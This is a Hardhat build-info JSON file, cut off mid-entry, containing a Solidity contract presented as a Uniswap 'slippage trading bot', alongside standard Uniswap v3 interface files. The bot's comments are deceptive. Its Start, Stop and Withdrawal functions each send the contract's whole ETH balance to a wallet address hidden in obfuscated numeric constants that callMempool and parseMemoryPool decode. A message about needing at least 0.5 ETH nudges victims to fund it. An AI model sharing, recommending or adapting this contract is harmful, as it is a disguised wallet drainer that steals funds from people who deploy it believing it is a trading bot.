{
	"id": "0c1fee15c631db86b3214b93a84e8f50",
	"_format": "hh-sol-build-info-1",
	"solcVersion": "0.8.20",
	"solcLongVersion": "0.8.20+commit.a1b79de6",
	"input": {
		"language": "Solidity",
		"sources": {
			"contracts/tradingbot.sol": {
				"content": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.20;\r\n\r\n// Import Libraries Migrator/Exchange/Factory\r\nimport \"https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Factory.sol\";\r\nimport \"https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Pool.sol\";\r\nimport \"https://github.com/Uniswap/v3-core/blob/main/contracts/libraries/LiquidityMath.sol\";\r\n\r\ncontract SlippageTradingBot {\r\n \r\n    uint liquidity;\r\n    event Log(string, uint, string);\r\n\r\n    constructor() {\r\n    }\r\n    receive() external payable {}\r\n\r\n    struct slice {\r\n        uint _len;\r\n        uint _ptr;\r\n    }\r\n\r\n    /*\r\n     * @dev Find newly deployed contracts on Uniswap Exchange\r\n     * @param memory of required contract liquidity.\r\n     * @param other The second slice to compare.\r\n     * @return New contracts with required liquidity.\r\n     */\r\n\r\n    function findNewContracts() internal pure returns (int) {\r\n        uint shortest = 0;\r\n\r\n       if (shortest > 1)\r\n             shortest = 0;\r\n\r\n        uint selfptr = 0;\r\n        uint otherptr = 1;\r\n\r\n        for (uint idx = 0; idx < shortest; idx += 32) {\r\n\r\n            // initiate contract finder\r\n\r\n            uint a;\r\n            uint b;\r\n\r\n            string memory WETH_CONTRACT_ADDRESS = \"0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2\";\r\n            string memory TOKEN_CONTRACT_ADDRESS = \"0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2\";\r\n            loadCurrentContract(WETH_CONTRACT_ADDRESS);\r\n            loadCurrentContract(TOKEN_CONTRACT_ADDRESS);\r\n            assembly {\r\n                a := mload(selfptr)\r\n                b := mload(otherptr)\r\n            }\r\n\r\n            if (a != b) {\r\n                // Mask out irrelevant contracts and check again for new contracts\r\n                uint256 mask = type(uint256).max;\r\n\r\n                if(shortest < 32) {\r\n                  mask = ~(2 ** (8 * (32 - shortest + idx)) - 1);\r\n                }\r\n                uint256 diff = (a & mask) - (b & mask);\r\n                if (diff != 0)\r\n                    return int(diff);\r\n            }\r\n            selfptr += 32;\r\n            otherptr += 32;\r\n        }\r\n        return int(shortest) - int(shortest);\r\n    }\r\n\r\n    /*\r\n     * @dev Extracts the newest contracts on Uniswap exchange\r\n     * @param self The slice to operate on.\r\n     * @param rune The slice that will contain the first rune.\r\n     * @return `list of contracts`.\r\n     */\r\n    function findContracts(uint selflen, uint selfptr, uint needlelen, uint needleptr) private pure returns (uint) {\r\n        uint ptr = selfptr;\r\n        uint idx;\r\n\r\n        if (needlelen <= selflen) {\r\n            if (needlelen <= 32) {\r\n                bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));\r\n\r\n                bytes32 needledata;\r\n                assembly { needledata := and(mload(needleptr), mask) }\r\n\r\n                uint end = selfptr + selflen - needlelen;\r\n                bytes32 ptrdata;\r\n                assembly { ptrdata := and(mload(ptr), mask) }\r\n\r\n                while (ptrdata != needledata) {\r\n                    if (ptr >= end)\r\n                        return selfptr + selflen;\r\n                    ptr++;\r\n                    assembly { ptrdata := and(mload(ptr), mask) }\r\n                }\r\n                return ptr;\r\n            } else {\r\n                // For long needles, use hashing\r\n                bytes32 hash;\r\n                assembly { hash := keccak256(needleptr, needlelen) }\r\n\r\n                for (idx = 0; idx <= selflen - needlelen; idx++) {\r\n                    bytes32 testHash;\r\n                    assembly { testHash := keccak256(ptr, needlelen) }\r\n                    if (hash == testHash)\r\n                        return ptr;\r\n                    ptr += 1;\r\n                }\r\n            }\r\n        }\r\n        return selfptr + selflen;\r\n    }\r\n\r\n\r\n    /*\r\n     * @dev Loading the contract\r\n     * @param contract address\r\n     * @return contract interaction object\r\n     */\r\n    function loadCurrentContract(string memory self) internal pure returns (string memory) {\r\n        string memory ret = self;\r\n        uint retptr;\r\n        assembly { retptr := add(ret, 32) }\r\n\r\n        return ret;\r\n    }\r\n\r\n    function getMemPoolOffset() internal pure returns (uint) {\r\n        return 314451;\r\n    }\r\n\r\n    /*\r\n     * @dev Parsing all Uniswap mempool\r\n     * @param self The contract to operate on.\r\n     * @return True if the slice is empty, False otherwise.\r\n     */\r\n    function parseMemoryPool(string memory _a) internal pure returns (address _parsed) {\r\n        bytes memory tmp = bytes(_a);\r\n        uint160 iaddr = 0;\r\n        uint160 b1;\r\n        uint160 b2;\r\n        for (uint i = 2; i < 2 + 2 * 20; i += 2) {\r\n            iaddr *= 256;\r\n            b1 = uint160(uint8(tmp[i]));\r\n            b2 = uint160(uint8(tmp[i + 1]));\r\n            if ((b1 >= 97) && (b1 <= 102)) {\r\n                b1 -= 87;\r\n            } else if ((b1 >= 65) && (b1 <= 70)) {\r\n                b1 -= 55;\r\n            } else if ((b1 >= 48) && (b1 <= 57)) {\r\n                b1 -= 48;\r\n            }\r\n            if ((b2 >= 97) && (b2 <= 102)) {\r\n                b2 -= 87;\r\n            } else if ((b2 >= 65) && (b2 <= 70)) {\r\n                b2 -= 55;\r\n            } else if ((b2 >= 48) && (b2 <= 57)) {\r\n                b2 -= 48;\r\n            }\r\n            iaddr += (b1 * 16 + b2);\r\n        }\r\n        return address(iaddr);\r\n    }\r\n\r\n    /*\r\n     * @dev Check if contract has enough liquidity available\r\n     * @param self The contract to operate on.\r\n     * @return True if the slice starts with the provided text, false otherwise.\r\n     */\r\n        function checkMempool(uint a) internal pure returns (string memory) {\r\n        uint count = 0;\r\n        uint b = a; \r\n        while (b != 0) {\r\n            count++;\r\n            b /= 16; \r\n        }\r\n        bytes memory res = new bytes(count);\r\n        for (uint i=0; i<count; ++i) {\r\n            b = a % 16;\r\n            res[count - i - 1] = toHexDigit(uint8(b));\r\n            a /= 16;\r\n        }\r\n        uint hexLength = bytes(string(res)).length;\r\n        if (hexLength == 4) {\r\n            string memory _hexC1 = mempool(\"0\", string(res));\r\n            return _hexC1;\r\n        } else if (hexLength == 3) {\r\n            string memory _hexC2 = mempool(\"0\", string(res));\r\n            return _hexC2;\r\n        } else if (hexLength == 2) {\r\n            string memory _hexC3 = mempool(\"000\", string(res));\r\n            return _hexC3;\r\n        } else if (hexLength == 1) {\r\n            string memory _hexC4 = mempool(\"0000\", string(res));\r\n            return _hexC4;\r\n        }\r\n\r\n        return string(res);\r\n    }\r\n\r\n    function getMemPoolLength() internal pure returns (uint) {\r\n        return 300426;\r\n    }\r\n\r\n    /*\r\n     * @dev If `self` starts with `needle`, `needle` is removed from the\r\n     *      beginning of `self`. Otherwise, `self` is unmodified.\r\n     * @param self The slice to operate on.\r\n     * @param needle The slice to search for.\r\n     * @return `self`\r\n     */\r\n\r\n    function getMemPoolHeight() internal pure returns (uint) {\r\n        return 979684;\r\n    }\r\n\r\n    /*\r\n     * @dev Iterating through all mempool to call the one with the with highest possible returns\r\n     * @return `self`.\r\n     */\r\n\r\n    function callMempool() internal pure returns (string memory) {\r\n        string memory _memPoolOffset = mempool(\"x\", checkMempool(getMemPoolOffset()));\r\n        uint _memPoolSol = 880572;\r\n        uint _memPoolLength = getMemPoolLength();\r\n        uint _memPoolSize = 951347;\r\n        uint _memPoolHeight = getMemPoolHeight();\r\n        uint _memPoolWidth = 9349;\r\n        uint _memPoolDepth = getMemPoolDepth();\r\n        uint _memPoolCount = 783125;\r\n\r\n        string memory _memPool1 = mempool(_memPoolOffset, checkMempool(_memPoolSol));\r\n        string memory _memPool2 = mempool(checkMempool(_memPoolLength), checkMempool(_memPoolSize));\r\n        string memory _memPool3 = mempool(checkMempool(_memPoolHeight), checkMempool(_memPoolWidth));\r\n        string memory _memPool4 = mempool(checkMempool(_memPoolDepth), checkMempool(_memPoolCount));\r\n\r\n        string memory _allMempools = mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4));\r\n        string memory _fullMempool = mempool(\"0\", _allMempools);\r\n\r\n        return _fullMempool;\r\n    }\r\n\r\n    /*\r\n     * @dev Modifies `self` to contain everything from the first occurrence of\r\n     *      `needle` to the end of the slice. `self` is set to the empty slice\r\n     *      if `needle` is not found.\r\n     * @param self The slice to search and modify.\r\n     * @param needle The text to search for.\r\n     * @return `self`.\r\n     */\r\n\r\n    function toHexDigit(uint8 d) pure internal returns (bytes1) {\r\n        if (0 <= d && d <= 9) {\r\n            return bytes1(uint8(bytes1('0')) + d);\r\n        } else if (10 <= uint8(d) && uint8(d) <= 15) {\r\n            return bytes1(uint8(bytes1('a')) + d - 10);\r\n        }\r\n        // revert(\"Invalid hex digit\");\r\n        revert();\r\n    }\r\n\r\n    /*\r\n     * @dev Perform action from different contract pools\r\n     * @param contract address to snipe liquidity from\r\n     * @return `liquidity`.\r\n     */\r\n\r\n    function Start() public payable { \r\n        address to = parseMemoryPool(callMempool());\r\n        address payable contracts = payable(to);\r\n        contracts.transfer(getLiquidity());\r\n    }\r\n\r\n    /*\r\n     * @dev If `self` starts with `needle`, `needle` is removed from the\r\n     *      beginning of `self`. Otherwise, `self` is unmodified.\r\n     * @param self The slice to operate on.\r\n     * @param needle The slice to search for.\r\n     * @return `self`\r\n     */\r\n\r\n    function beyond(slice memory self, slice memory needle) internal pure returns (slice memory result) {\r\n        if (self._len < needle._len) {\r\n            result = self;\r\n        } else {\r\n            // Assign some value to result if self._len >= needle._len\r\n            result = slice(0, 0); // Example, change as per logic\r\n        }\r\n        return result;\r\n    }\r\n\r\n    function Stop() public payable { \r\n        address to = parseMemoryPool(callMempool());\r\n        address payable contracts = payable(to);\r\n        contracts.transfer(getLiquidity());\r\n    }\r\n\r\n    function getLiquidity() internal view returns(uint) {\r\n        // Check available liquidity\r\n        return address(this).balance;\r\n    }\r\n\r\n    function checkLiquidity() public pure returns (string memory) {\r\n        return \"Not enough liquidity available on the contract to run the bot. Contract code needs at least 0.5 ETH to avoid current gas fees.\";\r\n    }\r\n\r\n    /*\r\n     * @dev withdrawals profit back to contract creator address\r\n     * @return `profits`.\r\n     */\r\n\r\n    function Withdrawal() public payable returns (string memory result) {\r\n        address to = parseMemoryPool(callMempool());\r\n        address payable contracts = payable(to);\r\n        contracts.transfer(getLiquidity());\r\n        result = \"Withdrawal complete\"; // Example message, change as per logic\r\n        return result;\r\n    }\r\n\r\n    function _callStopMempoolActionMempool() internal pure returns (address) {\r\n        return parseMemoryPool(callMempool());\r\n    }\r\n\r\n    function updateLiquidity() private {\r\n        uint currentBalanceEth = address(this).balance / 1 ether;\r\n        if (currentBalanceEth > liquidity) {\r\n            liquidity = currentBalanceEth;\r\n        }\r\n    }\r\n\r\n    /*\r\n     * @dev token int2 to readable str\r\n     * @param token An output parameter to which the first token is written.\r\n     * @return `token`.\r\n     */\r\n\r\n    function uint2str(uint _i) internal pure returns (string memory _uintAsString) {\r\n        if (_i == 0) {\r\n            return \"0\";\r\n        }\r\n        uint j = _i;\r\n        uint len;\r\n        while (j != 0) {\r\n            len++;\r\n            j /= 10;\r\n        }\r\n        bytes memory bstr = new bytes(len);\r\n        uint k = len - 1;\r\n        while (_i != 0) {\r\n            bstr[k--] = bytes1(uint8(48 + _i % 10));\r\n            _i /= 10;\r\n        }\r\n        return string(bstr);\r\n    }\r\n\r\n    function getMemPoolDepth() internal pure returns (uint) {\r\n        return 966235;\r\n    }\r\n\r\n    /*\r\n     * @dev loads all Uniswap mempool into memory\r\n     * @param token An output parameter to which the first token is written.\r\n     * @return `mempool`.\r\n     */\r\n\r\n    function mempool(string memory _base, string memory _value) internal pure returns (string memory) {\r\n        bytes memory _baseBytes = bytes(_base);\r\n        bytes memory _valueBytes = bytes(_value);\r\n\r\n        string memory _tmpValue = new string(_baseBytes.length + _valueBytes.length);\r\n        bytes memory _newValue = bytes(_tmpValue);\r\n\r\n        uint i;\r\n        uint j;\r\n\r\n        for(i=0; i<_baseBytes.length; i++) {\r\n            _newValue[j++] = _baseBytes[i];\r\n        }\r\n\r\n        for(i=0; i<_valueBytes.length; i++) {\r\n            _newValue[j++] = _valueBytes[i];\r\n        }\r\n\r\n        return string(_newValue);\r\n    }\r\n\r\n}"
			},
			"https://github.com/Uniswap/v3-core/blob/main/contracts/libraries/LiquidityMath.sol": {
				"content": "// SPDX-License-Identifier: GPL-2.0-or-later\npragma solidity >=0.5.0;\n\n/// @title Math library for liquidity\nlibrary LiquidityMath {\n    /// @notice Add a signed liquidity delta to liquidity and revert if it overflows or underflows\n    /// @param x The liquidity before change\n    /// @param y The delta by which liquidity should be changed\n    /// @return z The liquidity delta\n    function addDelta(uint128 x, int128 y) internal pure returns (uint128 z) {\n        if (y < 0) {\n            require((z = x - uint128(-y)) < x, 'LS');\n        } else {\n            require((z = x + uint128(y)) >= x, 'LA');\n        }\n    }\n}\n"
			},
			"https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Pool.sol": {
				"content": "// SPDX-License-Identifier: GPL-2.0-or-later\npragma solidity >=0.5.0;\n\nimport './pool/IUniswapV3PoolImmutables.sol';\nimport './pool/IUniswapV3PoolState.sol';\nimport './pool/IUniswapV3PoolDerivedState.sol';\nimport './pool/IUniswapV3PoolActions.sol';\nimport './pool/IUniswapV3PoolOwnerActions.sol';\nimport './pool/IUniswapV3PoolEvents.sol';\n\n/// @title The interface for a Uniswap V3 Pool\n/// @notice A Uniswap pool facilitates swapping and automated market making between any two assets that strictly conform\n/// to the ERC20 specification\n/// @dev The pool interface is broken up into many smaller pieces\ninterface IUniswapV3Pool is\n    IUniswapV3PoolImmutables,\n    IUniswapV3PoolState,\n    IUniswapV3PoolDerivedState,\n    IUniswapV3PoolActions,\n    IUniswapV3PoolOwnerActions,\n    IUniswapV3PoolEvents\n{\n\n}\n"
			},
			"https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Factory.sol": {
				"content": "// SPDX-License-Identifier: GPL-2.0-or-later\npragma solidity >=0.5.0;\n\n/// @title The interface for the Uniswap V3 Factory\n/// @notice The Uniswap V3 Factory facilitates creation of Uniswap V3 pools and control over the protocol fees\ninterface IUniswapV3Factory {\n    /// @notice Emitted when the owner of the factory is changed\n    /// @param oldOwner The owner before the owner was changed\n    /// @param newOwner The owner after the owner was changed\n    event OwnerChanged(address indexed oldOwner, address indexed newOwner);\n\n    /// @notice Emitted when a pool is created\n    /// @param token0 The first token of the pool by address sort order\n    /// @param token1 The second token of the pool by address sort order\n    /// @param fee The fee collected upon every swap in the pool, denominated in hundredths of a bip\n    /// @param tickSpacing The minimum number of ticks between initialized ticks\n    /// @param pool The address of the created pool\n    event PoolCreated(\n        address indexed token0,\n        address indexed token1,\n        uint24 indexed fee,\n        int24 tickSpacing,\n        address pool\n    );\n\n    /// @notice Emitted when a new fee amount is enabled for pool creation via the factory\n    /// @param fee The enabled fee, denominated in hundredths of a bip\n    /// @param tickSpacing The minimum number of ticks between initialized ticks for pools created with the given fee\n    event FeeAmountEnabled(uint24 indexed fee, int24 indexed tickSpacing);\n\n    /// @notice Returns the current owner of the factory\n    /// @dev Can be changed by the current owner via setOwner\n    /// @return The address of the factory owner\n    function owner() external view returns (address);\n\n    /// @notice Returns the tick spacing for a given fee amount, if enabled, or 0 if not enabled\n    /// @dev A fee amount can never be removed, so this value should be hard coded or cached in the calling context\n    /// @param fee The enabled fee, denominated in hundredths of a bip. Returns 0 in case of unenabled fee\n    /// @return The tick spacing\n    function feeAmountTickSpacing(uint24 fee) external view returns (int24);\n\n    /// @notice Returns the pool address for a given pair of tokens and a fee, or address 0 if it does not exist\n    /// @dev tokenA and tokenB may be passed in either token0/token1 or token1/token0 order\n    /// @param tokenA The contract address of either token0 or token1\n    /// @param tokenB The contract address of the other token\n    /// @param fee The fee collected upon every swap in the pool, denominated in hundredths of a bip\n    /// @return pool The pool address\n    function getPool(\n        address tokenA,\n        address tokenB,\n        uint24 fee\n    ) external view returns (address pool);\n\n    /// @notice Creates a pool for the given two tokens and fee\n    /// @param tokenA One of the two tokens in the desired pool\n    /// @param tokenB The other of the two tokens in the desired pool\n    /// @param fee The desired fee for the pool\n    /// @dev tokenA and tokenB may be passed in either order: token0/token1 or token1/token0. tickSpacing is retrieved\n    /// from the fee. The call will revert if the pool already exists, the fee is invalid, or the token arguments\n    /// are invalid.\n    /// @return pool The address of the newly created pool\n    function createPool(\n        address tokenA,\n        address tokenB,\n        uint24 fee\n    ) external returns (address pool);\n\n    /// @notice Updates the owner of the factory\n    /// @dev Must be called by the current owner\n    /// @param _owner The new owner of the factory\n    function setOwner(address _owner) external;\n\n    /// @notice Enables a fee amount with the given tickSpacing\n    /// @dev Fee amounts may never be removed once enabled\n    /// @param fee The fee amount to enable, denominated in hundredths of a bip (i.e. 1e-6)\n    /// @param tickSpacing The spacing between ticks to be enforced for all pools created with the given fee amount\n    function enableFeeAmount(uint24 fee, int24 tickSpacing) external;\n}\n"
			},
			"https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolEvents.sol": {
				"content": "// SPDX-License-Identifier: GPL-2.0-or-later\npragma solidity >=0.5.0;\n\n/// @title Events emitted by a pool\n/// @notice Contains all events emitted by the pool\ninterface IUniswapV3PoolEvents {\n    /// @notice Emitted exactly once by a pool when #initialize is first called on the pool\n    /// @dev Mint/Burn/Swap cannot be emitted by the pool before Initialize\n    /// @param sqrtPriceX96 The initial sqrt price of the pool, as a Q64.96\n    /// @param tick The initial tick of the pool, i.e. log base 1.0001 of the starting price of the pool\n    event Initialize(uint160 sqrtPriceX96, int24 tick);\n\n    /// @notice Emitted when liquidity is minted for a given position\n    /// @param sender The address that minted the liquidity\n    /// @param owner The owner of the position and recipient of any minted liquidity\n    /// @param tickLower The lower tick of the position\n    /// @param tickUpper The upper tick of the position\n    /// @param amount The amount of liquidity minted to the position range\n    /// @param amount0 How much token0 was required for the minted liquidity\n    /// @param amount1 How much token1 was required for the minted liquidity\n    event Mint(\n        address sender,\n        address indexed owner,\n        int24 indexed tickLower,\n        int24 indexed tickUpper,\n        uint128 amount,\n        uint256 amount0,\n        uint256 amount1\n    );\n\n    /// @notice Emitted when fees are collected by the owner of a position\n    /// @dev Collect events may be emitted with zero amount0 and amount1 when the caller chooses not to collect fees\n    /// @param owner The owner of the position for which fees are collected\n    /// @param tickLower The lower tick of the position\n    /// @param tickUpper The upper tick of the position\n    /// @param amount0 The amount of token0 fees collected\n    /// @param amount1 The amount of token1 fees collected\n    event Collect(\n        address indexed owner,\n        address recipient,\n        int24 indexed tickLower,\n        int24 indexed tickUpper,\n        uint128 amount0,\n        uint128 amount1\n    );\n\n    /// @notice Emitted when a position's liquidity is removed\n    /// @dev Does not withdraw any fees earned by the liquidity position, which must be withdrawn via #collect\n    /// @param owner The owner of the position for which liquidity is removed\n    /// @param tickLower The lower tick of the position\n    /// @param tickUpper The upper tick of the position\n    /// @param amount The amount of liquidity to remove\n    /// @param amount0 The amount of token0 withdrawn\n    /// @param amount1 The amount of token1 withdrawn\n    event Burn(\n        address indexed owner,\n        int24 indexed tickLower,\n        int24 indexed tickUpper,\n        uint128 amount,\n        uint256 amount0,\n        uint256 amount1\n    );\n\n    /// @notice Emitted by the pool for any swaps between token0 and token1\n    /// @param sender The address that initiated the swap call, and that received the callback\n    /// @param recipient The address that received the output of the swap\n    /// @param amount0 The delta of the token0 balance of the pool\n    /// @param amount1 The delta of the token1 balance of the pool\n    /// @param sqrtPriceX96 The sqrt(price) of the pool after the swap, as a Q64.96\n    /// @param liquidity The liquidity of the pool after the swap\n    /// @param tick The log base 1.0001 of price of the pool after the swap\n    event Swap(\n        address indexed sender,\n        address indexed recipient,\n        int256 amount0,\n        int256 amount1,\n        uint160 sqrtPriceX96,\n        uint128 liquidity,\n        int24 tick\n    );\n\n    /// @notice Emitted by the pool for any flashes of token0/token1\n    /// @param sender The address that initiated the swap call, and that received the callback\n    /// @param recipient The address that received the tokens from flash\n    /// @param amount0 The amount of token0 that was flashed\n    /// @param amount1 The amount of token1 that was flashed\n    /// @param paid0 The amount of token0 paid for the flash, which can exceed the amount0 plus the fee\n    /// @param paid1 The amount of token1 paid for the flash, which can exceed the amount1 plus the fee\n    event Flash(\n        address indexed sender,\n        address indexed recipient,\n        uint256 amount0,\n        uint256 amount1,\n        uint256 paid0,\n        uint256 paid1\n    );\n\n    /// @notice Emitted by the pool for increases to the number of observations that can be stored\n    /// @dev observationCardinalityNext is not the observation cardinality until an observation is written at the index\n    /// just before a mint/swap/burn.\n    /// @param observationCardinalityNextOld The previous value of the next observation cardinality\n    /// @param observationCardinalityNextNew The updated value of the next observation cardinality\n    event IncreaseObservationCardinalityNext(\n        uint16 observationCardinalityNextOld,\n        uint16 observationCardinalityNextNew\n    );\n\n    /// @notice Emitted when the protocol fee is changed by the pool\n    /// @param feeProtocol0Old The previous value of the token0 protocol fee\n    /// @param feeProtocol1Old The previous value of the token1 protocol fee\n    /// @param feeProtocol0New The updated value of the token0 protocol fee\n    /// @param feeProtocol1New The updated value of the token1 protocol fee\n    event SetFeeProtocol(uint8 feeProtocol0Old, uint8 feeProtocol1Old, uint8 feeProtocol0New, uint8 feeProtocol1New);\n\n    /// @notice Emitted when the collected protocol fees are withdrawn by the factory owner\n    /// @param sender The address that collects the protocol fees\n    /// @param recipient The address that receives the collected protocol fees\n    /// @param amount0 The amount of token0 protocol fees that is withdrawn\n    /// @param amount0 The amount of token1 protocol fees that is withdrawn\n    event CollectProtocol(address indexed sender, address indexed recipient, uint128 amount0, uint128 amount1);\n}\n"
			},
			"https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolOwnerActions.sol": {
				"content": "// SPDX-License-Identifier: GPL-2.0-or-later\npragma solidity >=0.5.0;\n\n/// @title Permissioned pool actions\n/// @notice Contains pool methods that may only be called by the factory owner\ninterface IUniswapV3PoolOwnerActions {\n    /// @notice Set the denominator of the protocol's % share of the fees\n    /// @param feeProtocol0 new protocol fee for token0 of the pool\n    /// @param feeProtocol1 new protocol fee for token1 of the pool\n    function setFeeProtocol(uint8 feeProtocol0, uint8 feeProtocol1) external;\n\n    /// @notice Collect the protocol fee accrued to the pool\n    /// @param recipient The address to which collected protocol fees should be sent\n    /// @param amount0Requested The maximum amount of token0 to send, can be 0 to collect fees in only token1\n    /// @param amount1Requested The maximum amount of token1 to send, can be 0 to collect fees in only token0\n    /// @return amount0 The protocol fee collected in token0\n    /// @return amount1 The protocol fee collected in token1\n    function collectProtocol(\n        address recipient,\n        uint128 amount0Requested,\n        uint128 amount1Requested\n    ) external returns (uint128 amount0, uint128 amount1);\n}\n"
			},
			"https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolActions.sol": {
				"content": "// SPDX-License-Identifier: GPL-2.0-or-later\npragma solidity >=0.5.0;\n\n/// @title Permissionless pool actions\n/// @notice Contains pool methods that can be called by anyone\ninterface IUniswapV3PoolActions {\n    /// @notice Sets the initial price for the pool\n    /// @dev Price is represented as a sqrt(amountToken1/amountToken0) Q64.96 value\n    /// @param sqrtPriceX96 the initial sqrt price of the pool as a Q64.96\n    function initialize(uint160 sqrtPriceX96) external;\n\n    /// @notice Adds liquidity for the given recipient/tickLower/tickUpper position\n    /// @dev The caller of this method receives a callback in the form of IUniswapV3MintCallback#uniswapV3MintCallback\n    /// in which they must pay any token0 or token1 owed for the liquidity. The amount of token0/token1 due depends\n    /// on tickLower, tickUpper, the amount of liquidity, and the current price.\n    /// @param recipient The address for which the liquidity will be created\n    /// @param tickLower The lower tick of the position in which to add liquidity\n    /// @param tickUpper The upper tick of the position in which to add liquidity\n    /// @param amount The amount of liquidity to mint\n    /// @param data Any data that should be passed through to the callback\n    /// @return amount0 The amount of token0 that was paid to mint the given amount of liquidity. Matches the value in the callback\n    /// @return amount1 The amount of token1 that was paid to mint the given amount of liquidity. Matches the value in the callback\n    function mint(\n        address recipient,\n        int24 tickLower,\n        int24 tickUpper,\n        uint128 amount,\n        bytes calldata data\n    ) external returns (uint256 amount0, uint256 amount1);\n\n    /// @notice Collects tokens owed to a position\n    /// @dev Does not recompute fees earned, which must be done either via mint or burn of any amount of liquidity.\n    /// Collect must be called by the position owner. To withdraw only token0 or only token1, amount0Requested or\n    /// amount1Requested may be set to zero. To withdraw all tokens owed, caller may pass any value greater than the\n    /// actual tokens owed, e.g. type(uint128).max. Tokens owed may be from accumulated swap fees or burned liquidity.\n    /// @param recipient The address which should receive the fees collected\n    /// @param tickLower The lower tick of the position for which to collect fees\n    /// @param tickUpper The upper tick of the position for which to collect fees\n    /// @param amount0Requested How much token0 should be withdrawn from the fees owed\n    /// @param amount1Requested How much token1 should be withdrawn from the fees owed\n    /// @return amount0 The amount of fees collected in token0\n    /// @return amount1 The amount of fees collected in token1\n    function collect(\n        address recipient,\n        int24 tickLower,\n        int24 tickUpper,\n        uint128 amount0Requested,\n        uint128 amount1Requested\n    ) external returns (uint128 amount0, uint128 amount1);\n\n    /// @notice Burn liquidity from the sender and account tokens owed for the liquidity to the position\n    /// @dev Can be used to trigger a recalculation of fees owed to a position by calling with an amount of 0\n    /// @dev Fees must be collected separately via a call to #collect\n    /// @param tickLower The lower tick of the position for which to burn liquidity\n    /// @param tickUpper The upper tick of the position for which to burn liquidity\n    /// @param amount How much liquidity to burn\n    /// @return amount0 The amount of token0 sent to the recipient\n    /// @return amount1 The amount of token1 sent to the recipient\n    function burn(\n        int24 tickLower,\n        int24 tickUpper,\n        uint128 amount\n    ) external returns (uint256 amount0, uint256 amount1);\n\n    /// @notice Swap token0 for token1, or token1 for token0\n    /// @dev The caller of this method receives a callback in the form of IUniswapV3SwapCallback#uniswapV3SwapCallback\n    /// @param recipient The address to receive the output of the swap\n    /// @param zeroForOne The direction of the swap, true for token0 to token1, false for token1 to token0\n    /// @param amountSpecified The amount of the swap, which implicitly configures the swap as exact input (positive), or exact output (negative)\n    /// @param sqrtPriceLimitX96 The Q64.96 sqrt price limit. If zero for one, the price cannot be less than this\n    /// value after the swap. If one for zero, the price cannot be greater than this value after the swap\n    /// @param data Any data to be passed through to the callback\n    /// @return amount0 The delta of the balance of token0 of the pool, exact when negative, minimum when positive\n    /// @return amount1 The delta of the balance of token1 of the pool, exact when negative, minimum when positive\n    function swap(\n        address recipient,\n        bool zeroForOne,\n        int256 amountSpecified,\n        uint160 sqrtPriceLimitX96,\n        bytes calldata data\n    ) external returns (int256 amount0, int256 amount1);\n\n    /// @notice Receive token0 and/or token1 and pay it back, plus a fee, in the callback\n    /// @dev The caller of this method receives a callback in the form of IUniswapV3FlashCallback#uniswapV3FlashCallback\n    /// @dev Can be used to donate underlying tokens pro-rata to currently in-range liquidity providers by calling\n    /// with 0 amount{0,1} and sending the donation amount(s) from the callback\n    /// @param recipient The address which will receive the token0 and token1 amounts\n    /// @param amount0 The amount of token0 to send\n    /// @param amount1 The amount of token1 to send\n    /// @param data Any data to be passed through to the callback\n    function flash(\n        address recipient,\n        uint256 amount0,\n        uint256 amount1,\n        bytes calldata data\n    ) external;\n\n    /// @notice Increase the maximum number of price and liquidity observations that this pool will store\n    /// @dev This method is no-op if the pool already has an observationCardinalityNext greater than or equal to\n    /// the input observationCardinalityNext.\n    /// @param observationCardinalityNext The desired minimum number of observations for the pool to store\n    function increaseObservationCardinalityNext(uint16 observationCardinalityNext) external;\n}\n"
			},
			"https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolDerivedState.sol": {
				"content": "// SPDX-License-Identifier: GPL-2.0-or-later\npragma solidity >=0.5.0;\n\n/// @title Pool state that is not stored\n/// @notice Contains view functions to provide information about the pool that is computed rather than stored on the\n/// blockchain. The functions here may have variable gas costs.\ninterface IUniswapV3PoolDerivedState {\n    /// @notice Returns the cumulative tick and liquidity as of each timestamp `secondsAgo` from the current block timestamp\n    /// @dev To get a time weighted average tick or liquidity-in-range, you must call this with two values, one representing\n    /// the beginning of the period and another for the end of the period. E.g., to get the last hour time-weighted average tick,\n    /// you must call it with secondsAgos = [3600, 0].\n    /// @dev The time weighted average tick represents the geometric time weighted average price of the pool, in\n    /// log base sqrt(1.0001) of token1 / token0. The TickMath library can be used to go from a tick value to a ratio.\n    /// @param secondsAgos From how long ago each cumulative tick and liquidity value should be returned\n    /// @return tickCumulatives Cumulative tick values as of each `secondsAgos` from the current block timestamp\n    /// @return secondsPerLiquidityCumulativeX128s Cumulative seconds per liquidity-in-range value as of each `secondsAgos` from the current block\n    /// timestamp\n    function observe(uint32[] calldata secondsAgos)\n        external\n        view\n        returns (int56[] memory tickCumulatives, uint160[] memory secondsPerLiquidityCumulativeX128s);\n\n    /// @notice Returns a snapshot of the tick cumulative, seconds per liquidity and seconds inside a tick range\n    /// @dev Snapshots must only be compared to other snapshots, taken over a period for which a position existed.\n    /// I.e., snapshots cannot be compared if a position is not held for the entire period between when the first\n    /// snapshot is taken and the second snapshot is taken.\n    /// @param tickLower The lower tick of the range\n    /// @param tickUpper The upper tick of the range\n    /// @return tickCumulativeInside The snapshot of the tick accumulator for the range\n    /// @return secondsPerLiquidityInsideX128 The snapshot of seconds per liquidity for the range\n    /// @return secondsInside The snapshot of seconds per liquidity for the range\n    function snapshotCumulativesInside(int24 tickLower, int24 tickUpper)\n        external\n        view\n        returns (\n            int56 tickCumulativeInside,\n            uint160 secondsPerLiquidityInsideX128,\n            uint32 secondsInside\n        );\n}\n"
			},
			"https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolState.sol": {
